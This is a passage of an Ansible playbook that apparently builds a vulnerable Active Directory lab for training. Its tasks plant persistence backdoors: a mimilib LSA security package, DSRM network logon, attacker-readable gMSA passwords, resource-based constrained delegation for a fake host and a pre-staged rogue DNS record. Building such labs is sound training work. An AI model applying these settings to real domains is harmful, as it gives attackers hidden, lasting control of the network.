# ------------------------------------------------------------------------------
# PER-024: SSP DLL (mimilib) - registry pointer only.
# ------------------------------------------------------------------------------
- name: PER-024 - LSA Security Packages backdoor entry
  ansible.windows.win_shell: |-
    $k = 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
    $cur = (Get-ItemProperty -Path "Registry::$k" -Name 'Security Packages').'Security Packages'
    if ($cur -notcontains 'mimilib') {
      $new = $cur + 'mimilib'
      Set-ItemProperty -Path "Registry::$k" -Name 'Security Packages' -Value $new -Type MultiString
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-025: DSRM backdoor - DsrmAdminLogonBehavior=2 lets DSRM account do
# network logon. Also set DSRM password to lab default.
# ------------------------------------------------------------------------------
- name: PER-025 - DSRM admin network logon enabled
  ansible.windows.win_regedit:
    path: 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
    name: DsrmAdminLogonBehavior
    data: 2
    type: dword
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-027: Self-Shadow Creds (KeyCredentialLink). user2 GenericWrite on self
# via AdminSDHolder is already set in PER-015/033. Mark the path.
# ------------------------------------------------------------------------------
- name: PER-027 - Self-Shadow Creds flag marker
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-PER-027-ShadowCreds.txt'
    content: "PER-027: Whisker/Set-ADComputer -KeyCredentialLink - persistent PKINIT auth as user2."
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-028: gMSA backdoor - add attacker to PrincipalsAllowedToRetrieveManagedPassword
# Pre-create gmsa01 if not present, then grant attacker read.
# ------------------------------------------------------------------------------
- name: PER-028 - Create gmsa01 and grant attacker password retrieval
  ansible.windows.win_shell: |-
    Import-Module ActiveDirectory
    try {
      # KDS root key needed for any gMSA - set -10 hours so it is immediately usable
      if (-not (Get-KdsRootKey -ErrorAction SilentlyContinue)) {
        Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10)) | Out-Null
      }
      if (-not (Get-ADServiceAccount -Filter "Name -eq 'gmsa01'" -ErrorAction SilentlyContinue)) {
        New-ADServiceAccount -Name 'gmsa01' `
          -DNSHostName 'gmsa01.corp.local' `
          -PrincipalsAllowedToRetrieveManagedPassword 'attacker' `
          -Enabled $true
      } else {
        Set-ADServiceAccount -Identity 'gmsa01' -PrincipalsAllowedToRetrieveManagedPassword 'attacker'
      }
    } catch { Write-Host "gMSA: $($_.Exception.Message)" }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-029: RBCD persistence - msDS-AllowedToActOnBehalfOfOtherIdentity on a
# privileged computer for attacker-owned fakehost$. fakehost$ + GenericAll
# wired in CRED-017. Add the RBCD attribute to FILE01$.
# ------------------------------------------------------------------------------
- name: PER-029 - RBCD on FILE01$ for fakehost$
  ansible.windows.win_shell: |-
    Import-Module ActiveDirectory
    try {
      $tgt = Get-ADComputer -Identity 'FILE01' -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
      $atk = Get-ADComputer -Identity 'fakehost'
      Set-ADComputer -Identity $tgt -PrincipalsAllowedToDelegateToAccount $atk
    } catch { Write-Host "RBCD persistence: $($_.Exception.Message)" }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-030: ADIDNS time bomb - pre-stage a DNS record for a future hostname.
# Authenticated Users can write thanks to CRED-026.
# ------------------------------------------------------------------------------
- name: PER-030 - Pre-stage rogue ADIDNS record
  ansible.windows.win_shell: |-
    try {
      Add-DnsServerResourceRecordA -Name 'new-fileserver' -ZoneName 'corp.local' `
        -IPv4Address '10.10.0.100' -AllowUpdateAny -ErrorAction SilentlyContinue | Out-Null
    } catch { Write-Host "ADIDNS pre-stage: $($_.Exception.Message)" }
  ignore_errors: yes

